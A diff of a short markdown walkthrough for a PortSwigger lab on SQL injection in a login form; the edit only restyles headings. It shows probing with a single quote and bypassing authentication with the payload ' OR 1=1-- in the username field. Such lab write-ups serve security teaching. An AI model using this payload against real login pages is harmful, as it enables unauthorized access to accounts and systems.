@@ -7,15 +7,15 @@ This lab contains a SQL injection vulnerability in the login function, allowing 
 
 **Lab Link** >> https://portswigger.net/web-security/sql-injection/lab-login-bypass
 
-# Navigate to
+*Navigate to*
 * /login
 
-# Test injection point
+*Test injection point*
 * username: '
 * password: test
 → Application returns server error (confirms injection)
 
-# Bypass authentication using payload
+*Bypass authentication using payload*
 * username: ' OR 1=1--
 * password: test
 Submit request → Login successful without valid credentials
